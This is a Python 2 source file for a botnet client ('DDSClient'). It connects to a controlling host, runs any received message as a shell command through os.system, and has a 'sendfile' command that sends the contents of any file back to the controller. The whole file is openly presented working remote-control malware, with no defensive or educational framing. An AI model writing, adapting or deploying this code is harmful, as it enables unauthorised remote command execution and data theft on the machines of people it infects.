#!/usr/bin/env python

"""Client connection for the bot net. \
				Tested with Python 2.7.6 \
				On MACOSX and Ubuntu
--------------------------------------------
Control commands for the bot:
	replyto X: Set default replyto address for broadcasts
	hostname: Send the client's hostname
	sendfile 'myfile': Send the specified file
	exit: Disconnect the client

Any other message will be executed directly with the 
os.system command.

				"""
##### Imports #####
#from threading import Thread
from sys import argv
from os import system
from socket import (
			socket, AF_INET, SHUT_RDWR,
			SOCK_STREAM, SOL_SOCKET,
			SO_REUSEADDR, gethostname,
			)
from argparse import (
			ArgumentParser,
			ArgumentDefaultsHelpFormatter
			)
from time import sleep
####################

#### (Magic) Defaults ####
ACCESS_ADDR = ''
PORT = 23456
HOST = 'localhost'
BUFFSIZE = 2048
VERSION = '1.0'
##########################

####### Argument Parser #######
def parseargs(args):
	verbose = "verbose output"
	pars = ArgumentParser(
		formatter_class=ArgumentDefaultsHelpFormatter,
	    fromfile_prefix_chars='<',
	    description=__doc__
	)
	pars.add_argument(
		'HOST',
		nargs = '?',
		default=HOST,
		help='The IP of the router',
		type=str
	)
	pars.add_argument(
		'PORT',
		nargs = '?',
		default=PORT,
		help='The port number of the router',
		type=int
	)
	pars.add_argument(
		'-v','--verbose',
		help=verbose,
		action='store_true'
	)
	pars.add_argument(
		'--version',
		action='version',
		version='%(prog)s ' + VERSION
	)

	pars.add_argument(
			'--buffer', '-b',
			type=int,
			metavar='M',
			choices=range(2048,10240),
			default=BUFFSIZE,
			help="The maximum size M of messages to \
					accept (2048 < M < 10240)"
	)
	return pars.parse_args(args)
####################################################

# Create a client socket
def clientsocket(host, port):
	s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.connect((host,port))
	return s


class Exit(Exception):
	''' An Abuse of Exceptions 
	... because return codes are just ugly'''
	pass

# This class represents a node in the botnet
class DDSClient:

	# Constructor
	def __init__(self, host = HOST, port = PORT, verbose=False, buffer=BUFFSIZE):
		try:
			self.client = clientsocket(host, port)
			self.address = int(self.client.recv(10).strip())
			if verbose:
				print self.address
		except Exception as e:
			if verbose:
				print "Error: Unable to connect"
			raise

		# sendto address for broadcast messages
		self.master = None

		# Map strings to commands and num args
		self.cmdmap = {
			"exit": (self.__del__, 0), 
			"replyto": (self.set_master, 2),
			"sendfile": (self.sendfile, 2),
			"hostname": (self.hostname, 1),
		}

		# Verbose output
		self.verbose = verbose

### Boiler plate ###
	def __repr__(self):
		return str("Commands: %d \n Sending To: %i\n" 
			% self.cmdmap % self.sendto)

	def __str__(self):
		return self.__repr__

	# Close the client socket and raise Exit
	def __del__(self):
		try:
			self.respond(self.address, 0)
			self.client.shutdown(SHUT_RDWR)
			self.client.close()
		except Exception:
			pass
		raise Exit
#####################
# Send the response
	def respond(self, to, payload):
		if int(to) == 255:
			if self.master:
				to = self.master
			elif self.verbose:
				print "Error: No replyto address specified"
				return
			else:
				return 

		res = str(to) + ": " + str(payload)
		if self.verbose:
			print "Sending..."
			print res
		self.client.send(res)


	# Handle the received command
	def __handle_msg__(self, msg):
		mtuple = msg.split(":", 1)
		try:
			print mtuple
			to = int(mtuple[0])
		except ValueError:
			raise
		payload = mtuple[1].strip()	
		try:
			cmdstr,arg = payload.split(' ', 1)
		except ValueError:
			# No args
			cmdstr = payload
			arg = None
		try:
			cmd, nargs = self.cmdmap[cmdstr]

			if nargs == 0:
				cmd()
			elif nargs == 1:
				cmd(to)
			elif nargs == 2:
				if arg:
					cmd(to, arg)
				elif self.verbose:
					respond(to, "Invalid Args")
		except KeyError:
			# no built-in command: execute payload
			self.execute(to, payload)
		except Exit:
			raise

# Commands ###
	def set_master(self, to, master):
		self.master = int(master)
		if self.verbose:
			self.respond(to, "Set replyto address successfully")

	def hostname(self,to):
		self.respond(to, gethostname())

	def sendfile(self, to, sfile):
		respond = self.respond
		sfile = sfile.strip("'\"")
		try:
			with open(sfile, 'r') as F:
				for line in F:
					respond(to, line)

		except IOError:
			msg = "Error: %s not found" %sfile
			if self.verbose:
				respond(to, msg)


	def execute(self,to, payload):
		rval = system(payload)
		if self.verbose:
			self.respond(to, "Executed: '%s' \r\n")
		self.respond(to, rval)
	
##############

# Listen for commands from the router
	def listen(self):
		# Localize functions
		recv = self.client.recv
		handle = self.__handle_msg__
		verbose = self.verbose
		while True:
			try:
				msg = recv(BUFFSIZE)
				if msg:
					if verbose:
						print "Received %s" % (msg,)
					handle(msg)
			except Exception as e:
				raise


	# Start listening for commands
	def __call__(self):
		try:
			client = self.listen()
		except Exit:
			pass
		finally:
			del self



def main():
	# parse args
	args = parseargs(argv[1:])

	# Create connection handler
	botConnect = DDSClient(host = args.HOST, port=args.PORT,
								verbose=args.verbose, buffer=args.buffer)
	# Accept connections
	botConnect()

if __name__ == '__main__':
	main()
